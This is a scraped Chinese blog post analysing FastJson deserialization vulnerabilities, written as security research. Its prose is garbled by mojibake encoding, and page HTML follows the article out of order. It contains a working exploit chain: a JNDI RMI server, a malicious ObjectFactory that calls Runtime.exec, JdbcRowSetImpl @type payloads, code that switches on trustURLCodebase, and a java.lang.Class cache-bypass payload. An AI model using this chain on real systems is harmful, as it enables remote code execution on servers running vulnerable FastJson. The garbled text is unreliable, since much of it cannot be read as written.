JdbcRowSetImpl ç±»ä½äº com.sun.rowset.JdbcRowSetImpl ï¼Œæ˜¯ javax.naming.InitialContext#lookup() å‚æ•°å¯æ§å¯¼è‡´çš„ JNDI æ³¨å…¥ã€‚\nJdbcRowSetImplè°ƒç”¨å‡½æ•°æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 exec:348, Runtime (java.lang) :19, badClassName (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:174, NamingManager (javax.naming.spi) getObjectInstance:330, NamingManager (javax.naming.spi) decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) connect:624, JdbcRowSetImpl (com.sun.rowset) setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) main:123, FastJsonTest (com.reus09) å…ˆçœ‹ä¸€ä¸‹ setAutoCommit() æ–¹æ³•ï¼Œåœ¨ conn ä¸ºç©ºæ—¶ï¼Œå°†ä¼šè°ƒç”¨ connect() æ–¹æ³•ã€‚\nç„¶ååœ¨connectæ–¹æ³•é‡Œé¢è°ƒç”¨äº† javax.naming.InitialContext#lookup() æ–¹æ³•ï¼Œå‚æ•°ä»æˆå‘˜å˜é‡ dataSource ä¸­è·å–ã€‚\né€šè¿‡å‡½æ•°æ ˆçš„å˜åŒ–ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œåœ¨FastJsonè§£æå‡½æ•°parseå‡½æ•°ä½œç”¨çš„æ—¶å€™ï¼Œé€šè¿‡åå°„ç»™ç±»çš„å…ƒç´ èµ‹å€¼çš„æ—¶å€™å¼•èµ·çš„å‘½ä»¤æ‰§è¡Œã€‚ ç¼–å†™ä¸€ä¸ªJNDIæœåŠ¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.reus09; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @ClassName JDNIServer * @Description TODO * @Author reus09 * @Date 2022/10/12 18:09 * @Version 1.0 **/ public class JDNIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"com.reus09.badClassName\", \"com.reus09.badClassName\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.reus09; import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class badClassName implements ObjectFactory { public badClassName() throws IOException { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } } Payloadéƒ¨åˆ†\nJSONæ ¼å¼\n1 2 3 4 5 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\":true } ä»£ç \n1 2 3 4 5 6 7 8 // è§£å†³javaç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œé»˜è®¤ä»¥ä¸‹çš„å…ƒç´ éƒ½ä¸ºfalse System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\"); System.setProperty(\"com.sun.jndi.cosnaming.object.trustURLCodebase\",\"true\"); System.out.println(\"JdbcRowSetImpl é“¾çš„åˆ©ç”¨\"); String payload2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\", \\\"autoCommit\\\":true}\"; JSON.parse(payload2); AutoTypeæœºåˆ¶ Fastjsonæä¾›äº†autotypeåŠŸèƒ½,å…è®¸ç”¨æˆ·åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­é€šè¿‡â€œ@typeâ€æŒ‡å®šååºåˆ—åŒ–çš„Classç±»å‹ã€‚\nç®€å•çš„æ¥è¯´å°±æ˜¯ï¼šå½“ä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªæ¥å£ï¼ˆæˆ–æŠ½è±¡ç±»ï¼‰çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸ååºåˆ—åŒ–ä¸­ï¼Œä¼šå°†å­ç±»å‹æŠ¹å»ï¼Œåªä¿ç•™æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰çš„ç±»å‹ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶æ— æ³•æ‹¿åˆ°åŸå§‹ç±»å‹ã€‚FastJsoné€šè¿‡ä½¿ç”¨autotypeæ¥å¯¹æŒ‡å®šçš„@typeå®ç°çš„æ¥å£åŒæ ·è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–ã€‚\nå…·ä½“çš„è¯ï¼Œçœ‹åšå®¢å¯¹AutoTypeèµ·åˆ°çš„ä½œç”¨è¿›è¡Œäº†ç®€å•çš„demoä¹¦å†™ã€‚\nä½†æ˜¯FastJsonå®˜æ–¹åœ¨1.2.25ä¹‹åå°†AutoTypeæœºåˆ¶å…³é—­ï¼Œä¸”åŠ å…¥äº†checkAutotypeï¼ŒåŠ å…¥äº†é»‘åå•+ç™½åå•æ¥é˜²å¾¡autotypeå¼€å¯çš„æƒ…å†µï¼Œè‡ªæ­¤å®˜æ–¹ä¸é»‘å®¢çš„åšå¼ˆå°±åœ¨ä¸æ–­è¿›è¡Œï¼Œé»‘å®¢è¯•å›¾å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œè€Œå®˜æ–¹ä¸æ–­çš„å°†å¯åˆ©ç”¨çš„ç±»åŠ å…¥é»‘åå•ï¼Œä¼˜åŒ–è‡ªå·±çš„checkAutoTypeæœºåˆ¶ã€‚\næœŸé—´ä¸€äº›ç»•è¿‡æ–¹æ¡ˆæ¯”å¦‚:Lã€;ã€[çš„ä¸€äº›ç»•è¿‡ï¼Œè¯¦æƒ…çœ‹[ç´ 18][https://su18.org/post/fastjson/#6-fastjson-1245]å¸ˆå‚…å¯¹æ­¤çš„ç›¸å…³ä»‹ç»ã€‚\nä½†æ˜¯åœ¨1.2.47ç‰ˆæœ¬ï¼Œçˆ†å‡ºäº†æœ€ä¸ºä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸å¼€å¯ AutoTypeSupport çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–çš„åˆ©ç”¨ï¼Œä¸»è¦æ˜¯å…ˆæŠŠä¸€ä¸ªç±»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œç„¶åå†æ¬¡æ‰§è¡Œçš„æ—¶å€™å°±å¯ä»¥ç»•è¿‡é»‘ç™½åå•æ£€æµ‹äº†ï¼Œé¦–å…ˆæƒ³è¦æŠŠä¸€ä¸ªé»‘åå•ä¸­çš„ç±»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªä¸åœ¨é»‘åå•ä¸­çš„ç±»ï¼Œè¿™ä¸ªç±»å°±æ˜¯java.lang.Classï¼Œjava.lang.Classç±»å¯¹åº”çš„deserializerä¸ºMiscCodecï¼Œååºåˆ—åŒ–æ—¶ä¼šå–jsonä¸²ä¸­çš„valå€¼å¹¶åŠ è½½è¿™ä¸ªvalå¯¹åº”çš„ç±»ã€‚\nå¦‚æœå†æ¬¡åŠ è½½valåç§°çš„ç±»ï¼Œå¹¶ä¸”autotypeæ²¡å¼€å¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¼šå°è¯•ä»å…¨å±€ç¼“å­˜ä¸­è·å–è¿™ä¸ªclassï¼Œè¿›è€Œè¿›è¡Œæ”»å‡»ã€‚\npayloadï¼š\n1 2 3 4 { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" } ä¹‹ååœ¨1.2.68å‡ºç°äº†å¯¹Throwableç±»çš„åˆ©ç”¨ï¼Œå¦‚æœï¼Œ@type æŒ‡å®šçš„ç±»ä¸º Throwable çš„å­ç±»ï¼Œé‚£å¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†ç±»å°±ä¼šä½¿ç”¨åˆ° ThrowableDeserializerï¼Œè€Œåœ¨ThrowableDeserializer#deserialzeçš„æ–¹æ³•ä¸­ï¼Œå½“æœ‰ä¸€ä¸ªå­—æ®µçš„keyä¹Ÿæ˜¯ @typeæ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ª value å½“åšç±»åï¼Œç„¶åè¿›è¡Œä¸€æ¬¡checkAutoTypeæ£€æµ‹ã€‚\nå‰©ä¸‹çš„å¯ä»¥çœ‹FastJson1.2.80çš„ç›¸å…³åˆ†æã€‚\næ€»ç»“ å®é™…ä¸Šï¼Œå­¦ä¹ åˆ°äº†ä¸€äº›FastJsonååºåˆ—åŒ–çš„åŸºæœ¬åŸç†ï¼Œä¹‹å‰éƒ½æ˜¯äº‘é‡Œé›¾é‡Œï¼Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚æ­¤å¤–ï¼Œå¯¹FastJsonçš„parseã€parseObjectç›¸å…³æ–¹æ³•çš„åŒºåˆ«ã€‚è¿˜æœ‰å°±æ˜¯å‘ç°ç°åœ¨å†™åšå®¢å¾€å¾€éƒ½æ˜¯å¯¹åˆ«äººçš„æ–‡ç« å¤§æŠ„ç‰¹æŠ„ï¼Œè‡ªå·±çš„ä¸œè¥¿ã€æ€è€ƒå¤ªå°‘äº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·å†™?ä¸ºä»€ä¹ˆè¿™ä¹ˆæ€è€ƒ?ä»¥åè¿˜æ˜¯éœ€è¦åŠªåŠ›ã€‚\nReference https://su18.org/post/fastjson/#1-fastjson-1224 http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/ https://www.yang99.top/index.php/archives/71/ https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl https://juejin.cn/post/6846687594130964488#heading-3 https://blog.csdn.net/hosaos/article/details/106982555 ",
  "wordCount" : "5662",
  "inLanguage": "en",
  "datePublished": "2022-10-12T14:04:36+08:00",
  "dateModified": "2022-10-12T14:04:36+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="ä¸»é¡µ">
                    <span>ä¸»é¡µ</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="æ–‡ç« ">
                    <span>æ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="æ—¶é—´è½´">
                    <span>æ—¶é—´è½´</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/categories" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="æ ‡ç­¾">
                    <span>æ ‡ç­¾</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“
    </h1>
    <div class="post-meta"><span title='2022-10-12 14:04:36 +0800 +0800'>2022-10-12</span>&nbsp;Â·&nbsp;12 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" aria-label="æ¼æ´ä»‹ç»">æ¼æ´ä»‹ç»</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%96%b9%e6%b3%95" aria-label="ååºåˆ—åŒ–æ–¹æ³•">ååºåˆ—åŒ–æ–¹æ³•</a></li>
                    <li>
                        <a href="#fastjson-1224%e5%88%86%e6%9e%90" aria-label="FastJson 1.2.24åˆ†æ"><code>FastJson 1.2.24</code>åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#templatesimpl-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="TemplatesImpl ååºåˆ—åŒ–"><code>TemplatesImpl</code> ååºåˆ—åŒ–</a></li>
                    <li>
                        <a href="#jdbcrowsetimpl--%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="JdbcRowSetImpl ååºåˆ—åŒ–"><code>JdbcRowSetImpl </code> ååºåˆ—åŒ–</a></li></ul>
                    </li>
                    <li>
                        <a href="#autotype%e6%9c%ba%e5%88%b6" aria-label="AutoTypeæœºåˆ¶">AutoTypeæœºåˆ¶</a></li>
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93" aria-label="æ€»ç»“">æ€»ç»“</a></li>
                    <li>
                        <a href="#reference" aria-label="Reference">Reference</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><p>å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†<code>FastJson1.2.80</code>æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜ä¹Ÿå­˜åœ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥æ¶æ„JSONå®ç°ååºåˆ—æ¼æ´ï¼Œå¦ä¸€æ–¹é¢ç”±äº<code>FastJson1.2.25</code>ä¹‹åéƒ½æ˜¯å¯¹AutoTypeæœºåˆ¶è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥ä¹Ÿç®€å•å­¦ä¹ äº†AutoTypeCheckæœºåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›æœŸæœ›ç±»çš„<code>Gadget</code>ã€‚æœ¬æ–‡ä¸»è¦å¯¹<code>FastJson</code>å¸¸ç”¨çš„çš„è§£æ<code>String</code>çš„parse,parseObjectç­‰æ–¹æ³•è¿›è¡Œåˆ†æï¼Œç„¶ååˆ†æAutoTypeCheckæœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯¹FastJsonå†å²æ¼æ´è¿›è¡Œç®€å•çš„æ•´ç†ã€‚</p>
<h2 id="æ¼æ´ä»‹ç»">æ¼æ´ä»‹ç»<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´ä»‹ç»">#</a></h2>
<p>è¿™é‡Œå°±å†ä»‹ç»ä¸€ä¸‹FastJsonçš„èƒŒæ™¯ã€‚</p>
<p>fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚</p>
<p>ç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚</p>
<p>è¿™é‡Œæ”¾ä¸€ä¸‹æ¡†æ¶å›¾</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1616458393831.png" alt="img"  />
</p>
<p>ä¸»è¦åŠŸèƒ½åœ¨<code>DefaultJSONParser</code>ç±»ä¸­å®ç°çš„ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ä¼šåº”ç”¨å…¶ä»–çš„ä¸€äº›å¤–éƒ¨ç±»æ¥å®Œæˆåç»­æ“ä½œã€‚<code>ParserConfig</code>ä¸»è¦æ˜¯è¿›è¡Œé…ç½®ä¿¡æ¯çš„åˆå§‹åŒ–ï¼Œ<code>JSONLexer</code>ä¸»è¦æ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†å¹¶åˆ†æï¼Œååºåˆ—åŒ–åœ¨<code>JavaBeanDeserializer</code>ä¸­å¤„ç†ã€‚</p>
<h2 id="ååºåˆ—åŒ–æ–¹æ³•">ååºåˆ—åŒ–æ–¹æ³•<a hidden class="anchor" aria-hidden="true" href="#ååºåˆ—åŒ–æ–¹æ³•">#</a></h2>
<p>å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸º<code>parse()</code>ã€<code>parseObject()</code>ã€<code>parseArray()</code>ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•ä¹Ÿå‡åŒ…å«è‹¥å¹²é‡è½½æ–¹æ³•ï¼Œå¸¦æœ‰ä¸åŒå‚æ•°ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–ç‰¹æ€§ï¼š<code>com.alibaba.fastjson.parser.Feature</code>ï¼Œ</li>
<li>ç±»çš„ç±»å‹ï¼š<code>java.lang.reflect.Type</code>ï¼Œç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–ç±»çš„ç±»å‹ã€‚</li>
<li>å¤„ç†æ³›å‹ååºåˆ—åŒ–ï¼š<code>com.alibaba.fastjson.TypeReference</code>ã€‚</li>
<li>ç¼–ç¨‹æ‰©å±•å®šåˆ¶ååºåˆ—åŒ–ï¼š<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>ï¼Œä¾‹å¦‚<code>ExtraProcessor</code> ç”¨äºå¤„ç†å¤šä½™çš„å­—æ®µï¼Œ<code>ExtraTypeProvider</code> ç”¨äºå¤„ç†å¤šä½™å­—æ®µæ—¶æä¾›ç±»å‹ä¿¡æ¯ã€‚</li>
</ul>
<p>è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson åŠŸèƒ½è¦ç‚¹ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</li>
<li>fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ <code>get</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>ã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ <code>set</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> ä¸­ã€‚</li>
<li>ä½¿ç”¨ <code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚</li>
<li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</li>
<li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_|-</code> å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ <code>_</code> å’Œ <code>-</code> è¿›è¡Œç»„åˆæ··æ·†ã€‚</li>
<li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</li>
</ul>
<p>ä¸ºäº†æµ‹è¯•ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemo</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
